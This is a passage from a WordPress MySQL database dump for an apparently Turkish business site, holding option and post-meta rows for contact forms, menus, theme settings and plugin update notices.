Kong)\";s:11:\"native_name\";s:16:\"香港中文版	\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/zh_HK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"繼續\";}}s:5:\"zh_TW\";a:8:{s:8:\"language\";s:5:\"zh_TW\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-14 16:53:54\";s:12:\"english_name\";s:16:\"Chinese (Taiwan)\";s:11:\"native_name\";s:12:\"繁體中文\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/zh_TW.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"繼續\";}}}","no");
INSERT INTO `cmrfu_options` VALUES("17674","_transient_timeout_GOTMLS_upgrade_notice_4.16.39_4.16.48","1483988460","no");
INSERT INTO `cmrfu_options` VALUES("17675","_transient_GOTMLS_upgrade_notice_4.16.39_4.16.48","<div class=\"GOTMLS_upgrade_notice\"><li><b>4.16.48:</b> Added fall-back to manual updates if the Automatic update feature fails, fixed PHP Notices  and improved Apache version detection.

</li><li><b>4.16.47:</b> Changed Automatic update feature, added PHP and Apache version detections, and removed the onbeforeunload function other code that was deprecated.</li></div>","no");
INSERT INTO `cmrfu_options` VALUES("15885","wpseo_flush_rewrite","1","yes");
INSERT INTO `cmrfu_options` VALUES("16186","wpseo_sitemap_wpcf7_contact_form_cache_validator","73jb9","no");
INSERT INTO `cmrfu_options` VALUES("17181","wpseo_sitemap_146_cache_validator","3ZGu2","no");
INSERT INTO `cmrfu_options` VALUES("17182","wpseo_sitemap_141_cache_validator","3ZGu6","no");
INSERT INTO `cmrfu_options` VALUES("18309","_transient_timeout_GOTMLS_upgrade_notice_4.16.48_4.16.49","1485270017","no");
INSERT INTO `cmrfu_options` VALUES("19400","_transient_GOTMLS_upgrade_notice_4.16.49_4.16.53","<div class=\"GOTMLS_upgrade_notice\"><li><b>4.16.53:</b> Fixed the details window to scrolls to the highlighted code, set default Potential Threat scan to disabled, and encoded definitions array for DB storage.</li></div>","no");
INSERT INTO `cmrfu_options` VALUES("17176","wpseo_sitemap_168_cache_validator","3ZGtK","no");
INSERT INTO `cmrfu_options` VALUES("17177","wpseo_sitemap_166_cache_validator","3ZGtN","no");
INSERT INTO `cmrfu_options` VALUES("17178","wpseo_sitemap_162_cache_validator","3ZGtR","no");
INSERT INTO `cmrfu_options` VALUES("17179","wpseo_sitemap_159_cache_validator","3ZGtU","no");
INSERT INTO `cmrfu_options` VALUES("17180","wpseo_sitemap_151_cache_validator","3ZGtY","no");
INSERT INTO `cmrfu_options` VALUES("17175","wpseo_sitemap_173_cache_validator","3ZGtA","no");
INSERT INTO `cmrfu_options` VALUES("16238","wpseo_sitemap_slider_cache_validator","5EN82","no");
INSERT INTO `cmrfu_options` VALUES("18305","_site_transient_timeout_browser_c84d964a17b5faa65315addaacd2bcbd","1485788407","no");
INSERT INTO `cmrfu_options` VALUES("18306","_site_transient_browser_c84d964a17b5faa65315addaacd2bcbd","a:9:{s:8:\"platform\";s:9:\"Macintosh\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"55.0.2883.95\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");
INSERT INTO `cmrfu_options` VALUES("18314","_transient_timeout_yoast_i18n_wordpress-seo_tr_TR","1485270053","no");
INSERT INTO `cmrfu_options` VALUES("18315","_transient_yoast_i18n_wordpress-seo_tr_TR","","no");
INSERT INTO `cmrfu_options` VALUES("19392","_site_transient_timeout_browser_2d20cdec9e46ccf938fa2266bead68d1","1489739058","no");
INSERT INTO `cmrfu_options` VALUES("19393","_site_transient_browser_2d20cdec9e46ccf938fa2266bead68d1","a:9:{s:8:\"platform\";s:9:\"Macintosh\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"56.0.2924.87\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");


DROP TABLE IF EXISTS `cmrfu_postmeta`;

CREATE TABLE `cmrfu_postmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `post_id` (`post_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=2429 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_postmeta` VALUES("2","4","_form","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-897 size:m] [captchar captcha-897]</p>

<p>[submit \"Gönder\"]</p>");
INSERT INTO `cmrfu_postmeta` VALUES("3","4","_mail","a:8:{s:7:\"subject\";s:24:\"İsmido İletişim Formu\";s:6:\"sender\";s:18:\"info@ismido.com.tr\";s:4:\"body\";s:83:\"isim: [your-name]

email: [your-email]

konu: [your-subject]

ileti: [your-message]\";s:9:\"recipient\";s:18:\"info@ismido.com.tr\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:1;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("4","4","_mail_2","a:9:{s:6:\"active\";b:0;s:7:\"subject\";s:0:\"\";s:6:\"sender\";s:0:\"\";s:4:\"body\";s:0:\"\";s:9:\"recipient\";s:0:\"\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("5","4","_messages","a:23:{s:12:\"mail_sent_ok\";s:56:\"İletiniz başarılı olarak gönderildi. Teşekkürler.\";s:12:\"mail_sent_ng\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:16:\"validation_error\";s:85:\"Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.\";s:4:\"spam\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:12:\"accept_terms\";s:48:\"İlerlemek için lütfen koşulları kabul edin.\";s:16:\"invalid_required\";s:35:\"Lütfen gerekli alanları doldurun.\";s:17:\"captcha_not_match\";s:30:\"Girdiğiniz kod doğru değil.\";s:14:\"invalid_number\";s:37:\"Sayı biçimi geçersiz görünüyor.\";s:16:\"number_too_small\";s:23:\"Bu sayı çok küçük.\";s:16:\"number_too_large\";s:22:\"Bu sayı çok büyük.\";s:13:\"invalid_email\";s:37:\"Eposta adresi geçersiz görünüyor.\";s:11:\"invalid_url\";s:27:\"URL geçersiz görünüyor.\";s:11:\"invalid_tel\";s:41:\"Telefon numarası geçersiz görünüyor.\";s:23:\"quiz_answer_not_correct\";s:27:\"Yanıtınız doğru değil.\";s:12:\"invalid_date\";s:37:\"Tarih biçimi geçersiz görünüyor.\";s:14:\"date_too_early\";s:20:\"Bu tarih çok erken.\";s:13:\"date_too_late\";s:19:\"Bu tarih çok geç.\";s:13:\"upload_failed\";s:29:\"Dosya gönderme başarısız.\";s:24:\"upload_file_type_invalid\";s:34:\"Bu dosya türüne izin verilmiyor.\";s:21:\"upload_file_too_large\";s:22:\"Bu dosya çok büyük.\";s:23:\"upload_failed_php_error\";s:49:\"Dosya gönderme başarısız. Hata meydana geldi.\";s:16:\"invalid_too_long\";s:22:\"The field is too long.\";s:17:\"invalid_too_short\";s:23:\"The field is too short.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("6","4","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("7","4","_locale","tr_TR");
INSERT INTO `cmrfu_postmeta` VALUES("1491","710","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2015","948","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2016","950","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("2017","950","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("2018","950","_menu_item_object_id","950");
INSERT INTO `cmrfu_postmeta` VALUES("2019","950","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("2020","950","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2025","950","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2023","950","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("2022","950","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2021","950","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2014","949","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2012","949","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2011","949","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("44","11","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("45","11","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("46","11","_menu_item_object_id","11");
INSERT INTO `cmrfu_postmeta` VALUES("47","11","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("48","11","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("49","11","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("50","11","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("51","11","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("52","12","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("53","12","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("54","12","_menu_item_object_id","12");
INSERT INTO `cmrfu_postmeta` VALUES("55","12","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("56","12","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("57","12","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("58","12","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("59","12","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("60","13","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("61","13","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("62","13","_menu_item_object_id","13");
INSERT INTO `cmrfu_postmeta` VALUES("63","13","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("64","13","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("65","13","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("66","13","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("67","13","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("68","14","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("69","14","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("70","14","_menu_item_object_id","14");
INSERT INTO `cmrfu_postmeta` VALUES("71","14","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("72","14","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("73","14","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("74","14","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("75","14","_menu_item_url","http://everislabs.com/themes/er-leaf/portfolio/");
INSERT INTO `cmrfu_postmeta` VALUES("377","447","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("378","447","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("379","447","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("380","447","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("381","447","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("382","447","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("383","447","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("384","447","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("385","447","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("386","447","er_leaf_heading_custom_code","[map lat=\"41.043189\" lon=\"29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"350\" maptype=\"ROADMAP\" address=\"Kocatepe Mahallesi Kuru Gıda Hali Mega Center Istanbul \" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"İsmido<br />Bayrampaşa <br />İstanbul \" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map]");
INSERT INTO `cmrfu_postmeta` VALUES("387","447","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("388","447","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("389","447","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("390","454","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("391","454","er_leaf_page_sidebar","content-sidebar");
INSERT INTO `cmrfu_postmeta` VALUES("392","454","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("393","454","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("394","454","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("395","454","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("396","454","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("397","454","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("398","454","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("399","454","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("400","497","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("401","497","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("402","497","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("403","497","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("404","497","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("405","497","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("406","497","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("407","497","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("408","497","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("409","497","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("410","497","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("411","497","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("425","524","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("426","524","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("427","524","er_leaf_page_heading","0");
INSERT INTO `cmrfu_postmeta` VALUES("428","524","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("429","524","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("430","524","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("431","524","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("432","524","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("433","524","er_leaf_revolutionslider","home");
INSERT INTO `cmrfu_postmeta` VALUES("434","524","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("435","524","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("436","524","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2293","1074","_wp_attached_file","2014/08/midye-tahlil-raporu.pdf");
INSERT INTO `cmrfu_postmeta` VALUES("548","177","er_leaf_project_images","180");
INSERT INTO `cmrfu_postmeta` VALUES("549","177","er_leaf_project_images","179");
INSERT INTO `cmrfu_postmeta` VALUES("550","177","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2226","177","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("553","177","er_leaf_project_custom_field","
");
INSERT INTO `cmrfu_postmeta` VALUES("554","177","_thumbnail_id","1059");
INSERT INTO `cmrfu_postmeta` VALUES("555","182","er_leaf_project_images","171");
INSERT INTO `cmrfu_postmeta` VALUES("556","182","er_leaf_project_images","169");
INSERT INTO `cmrfu_postmeta` VALUES("557","182","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2221","182","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("561","182","_thumbnail_id","1058");
INSERT INTO `cmrfu_postmeta` VALUES("562","184","er_leaf_project_images","143");
INSERT INTO `cmrfu_postmeta` VALUES("563","184","er_leaf_project_images","144");
INSERT INTO `cmrfu_postmeta` VALUES("564","184","er_leaf_project_images","145");
INSERT INTO `cmrfu_postmeta` VALUES("565","184","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2216","184","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("1699","182","_edit_lock","1479850118:1");
INSERT INTO `cmrfu_postmeta` VALUES("568","184","_thumbnail_id","1057");
INSERT INTO `cmrfu_postmeta` VALUES("704","186","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1669","524","_edit_lock","1479851587:1");
INSERT INTO `cmrfu_postmeta` VALUES("1671","717","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1876","918","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("1673","184","_edit_lock","1479850046:1");
INSERT INTO `cmrfu_postmeta` VALUES("1668","186","_wp_old_slug","alpay-konak");
INSERT INTO `cmrfu_postmeta` VALUES("2210","186","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("708","186","er_leaf_project_images","174");
INSERT INTO `cmrfu_postmeta` VALUES("709","186","er_leaf_project_images","175");
INSERT INTO `cmrfu_postmeta` VALUES("2211","918","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("712","186","er_leaf_meta_title","House Happy");
INSERT INTO `cmrfu_postmeta` VALUES("713","186","er_leaf_meta_desc","Proin ut ligula vel nunc egestas porttitor. Morbi lectus risus, iaculis vel, suscipit quis, luctus non, massa. Fusce ac turpis quis ligula lacinia aliquet. Mauris ipsum.");
INSERT INTO `cmrfu_postmeta` VALUES("714","186","er_leaf_meta_keyword","Morbi lectus risus, iaculis vel");
INSERT INTO `cmrfu_postmeta` VALUES("715","446","_form","<p>İsim*<br />
    [text* your-name] </p>

<p>Email*<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>Mesajınız<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Gönder\"]</p>");
INSERT INTO `cmrfu_postmeta` VALUES("716","446","_mail","a:7:{s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:21:\"info@herkonyapi.com\";s:4:\"body\";s:173:\"From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:21:\"info@herkonyapi.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("717","446","_mail_2","a:8:{s:6:\"active\";b:0;s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:115:\"Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:12:\"[your-email]\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("718","446","_messages","a:21:{s:12:\"mail_sent_ok\";s:43:\"Your message was sent successfully. Thanks.\";s:12:\"mail_sent_ng\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:16:\"validation_error\";s:74:\"Validation errors occurred. Please confirm the fields and submit it again.\";s:4:\"spam\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:12:\"accept_terms\";s:35:\"Please accept the terms to proceed.\";s:16:\"invalid_required\";s:31:\"Please fill the required field.\";s:17:\"captcha_not_match\";s:31:\"Your entered code is incorrect.\";s:12:\"invalid_date\";s:26:\"Date format seems invalid.\";s:14:\"date_too_early\";s:23:\"This date is too early.\";s:13:\"date_too_late\";s:22:\"This date is too late.\";s:13:\"upload_failed\";s:22:\"Failed to upload file.\";s:24:\"upload_file_type_invalid\";s:30:\"This file type is not allowed.\";s:21:\"upload_file_too_large\";s:23:\"This file is too large.\";s:23:\"upload_failed_php_error\";s:38:\"Failed to upload file. Error occurred.\";s:14:\"invalid_number\";s:28:\"Number format seems invalid.\";s:16:\"number_too_small\";s:25:\"This number is too small.\";s:16:\"number_too_large\";s:25:\"This number is too large.\";s:23:\"quiz_answer_not_correct\";s:27:\"Your answer is not correct.\";s:13:\"invalid_email\";s:28:\"Email address seems invalid.\";s:11:\"invalid_url\";s:18:\"URL seems invalid.\";s:11:\"invalid_tel\";s:31:\"Telephone number seems invalid.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("719","446","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("720","446","_locale","en_US");
INSERT INTO `cmrfu_postmeta` VALUES("721","449","_form","<div class=\"cols\">
<div class=\"col-4\">
<p>Your Name (required)<br />
    [text* your-name] </p>

<p>Your Email (required)<br />
    [email* your-email] </p>

<p>Subject<br />
    [text your-subject] </p>
</div>
<div class=\"col-4\">
<p>Your Message<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Send\"]</p>
</div>
</div>");
INSERT INTO `cmrfu_postmeta` VALUES("722","449","_mail","a:7:{s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:173:\"From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:22:\"hoathuancntt@gmail.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("723","449","_mail_2","a:8:{s:6:\"active\";b:0;s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:115:\"Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:12:\"[your-email]\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("724","449","_messages","a:21:{s:12:\"mail_sent_ok\";s:43:\"Your message was sent successfully. Thanks.\";s:12:\"mail_sent_ng\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:16:\"validation_error\";s:74:\"Validation errors occurred. Please confirm the fields and submit it again.\";s:4:\"spam\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:12:\"accept_terms\";s:35:\"Please accept the terms to proceed.\";s:16:\"invalid_required\";s:31:\"Please fill the required field.\";s:17:\"captcha_not_match\";s:31:\"Your entered code is incorrect.\";s:12:\"invalid_date\";s:26:\"Date format seems invalid.\";s:14:\"date_too_early\";s:23:\"This date is too early.\";s:13:\"date_too_late\";s:22:\"This date is too late.\";s:13:\"upload_failed\";s:22:\"Failed to upload file.\";s:24:\"upload_file_type_invalid\";s:30:\"This file type is not allowed.\";s:21:\"upload_file_too_large\";s:23:\"This file is too large.\";s:23:\"upload_failed_php_error\";s:38:\"Failed to upload file. Error occurred.\";s:14:\"invalid_number\";s:28:\"Number format seems invalid.\";s:16:\"number_too_small\";s:25:\"This number is too small.\";s:16:\"number_too_large\";s:25:\"This number is too large.\";s:23:\"quiz_answer_not_correct\";s:27:\"Your answer is not correct.\";s:13:\"invalid_email\";s:28:\"Email address seems invalid.\";s:11:\"invalid_url\";s:18:\"URL seems invalid.\";s:11:\"invalid_tel\";s:31:\"Telephone number seems invalid.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("725","449","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("726","449","_locale","en_US");
INSERT INTO `cmrfu_postmeta` VALUES("746","710","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("747","710","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("748","710","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("749","710","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("750","710","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("751","710","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("752","710","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("753","710","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2010","949","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2009","949","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2008","949","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("2007","949","_menu_item_object_id","944");
INSERT INTO `cmrfu_postmeta` VALUES("2006","949","_menu_item_menu_item_parent","950");
INSERT INTO `cmrfu_postmeta` VALUES("2005","949","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("2003","948","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2002","948","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2001","948","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2000","948","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1999","948","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1998","948","_menu_item_object_id","946");
INSERT INTO `cmrfu_postmeta` VALUES("786","715","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("787","715","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("788","715","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("789","715","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("790","715","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("791","715","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("792","715","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("793","715","_menu_item_url","");
